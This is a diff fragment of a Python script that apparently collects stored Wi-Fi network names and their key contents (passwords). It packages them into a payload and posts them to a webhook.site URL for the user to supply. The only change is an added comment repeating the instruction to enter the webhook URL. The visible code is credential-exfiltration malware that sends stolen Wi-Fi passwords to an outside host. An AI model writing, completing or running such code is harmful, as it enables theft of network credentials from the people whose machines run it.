@@ -25,6 +25,6 @@ for profile_name in profile_names:
 payload = {'profiles': '\n'.join([f"\nSSID: {ssid}\nKey Content: {key_content}\n" for ssid, key_content in wifi_info.items()])}
 
 # Send data through Webhook.site
-response = requests.post('ENTER YOUR webhook.site URL HERE', data=payload)
+response = requests.post('ENTER YOUR webhook.site URL HERE', data=payload) # Enter your webhook.site URL Here
 
 print(response.text)  # Print the response from the webhook
